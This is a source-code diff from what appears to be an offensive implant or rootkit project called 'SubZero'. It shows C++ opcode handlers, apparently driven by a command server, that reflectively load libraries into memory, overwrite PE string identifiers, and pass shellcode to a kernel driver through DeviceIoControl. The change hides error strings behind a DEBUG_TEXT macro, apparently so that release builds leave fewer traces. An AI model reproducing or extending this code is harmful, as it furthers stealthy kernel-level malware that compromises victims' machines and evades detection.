@@ -6,6 +6,7 @@
 #include "../SubZeroUtils/RegistryManager.h"
 #include "../SubZeroUtils/ServiceManager.h"
 #include "../SubZeroUtils/AutoHandle.h"
+#include "../SubZeroUtils/DebugPrint.h"
 #include "../SubZeroCleanup/SubZeroCleanup.h"
 
 #include <Windows.h>"
@@ -20,7 +21,7 @@ void LoadLibraryReflectively_OpcodeHandler(const PVOID Data, const size_t DataLe
 {
     PMEMORY_MODULE hModule = ReflectiveLibraryLoader::MemoryLoadLibrary(Data, DataLength);
     if (nullptr == hModule)
-        throw std::runtime_error("[-] Library module object failed to initialize");
+        throw std::runtime_error(DEBUG_TEXT("[-] Library module object failed to initialize"));
 
     ReflectiveLibraryLoader::OverridePeStringIdentifiers(hModule);
 }
@@ -36,7 +37,7 @@ void InjectKernelShellcode_OpcodeHandler(const PVOID Data, const size_t DataLeng
         0,
         nullptr));
     if (INVALID_HANDLE_VALUE == deviceAutoHandle.get()) 
-        throw std::runtime_error("[-] Failed to open the device handle");
+        throw std::runtime_error(DEBUG_TEXT("[-] Failed to open the device handle"));
 
 	// Create SubZeroExecuteShellcodeData structure
     auto const bufferSize = DataLength + sizeof(SubZeroExecuteShellcodeData);
@@ -61,7 +62,7 @@ void InjectKernelShellcode_OpcodeHandler(const PVOID Data, const size_t DataLeng
         outputBuffer.get(), shellcodeDataStruct->ReturnedDataMaxSize,	   	// output buffer
         &bytesReturned,                  											// # bytes returned
         nullptr))
-        throw std::runtime_error("[-] DeviceIoControl Failed");
+        throw std::runtime_error(DEBUG_TEXT("[-] DeviceIoControl Failed"));
 
 	if (0 < bytesReturned)
         ReturnedData->append(outputBuffer.get(), bytesReturned);
@@ -84,7 +85,7 @@ void ResponseHandler(const ServerOpcode ServerOC, const PVOID Data, const size_t
         break;
     	
     default:        
-        throw std::runtime_error("[-] Unknown opcode");
+        throw std::runtime_error(DEBUG_TEXT("[-] Unknown opcode"));
     }
 }
 
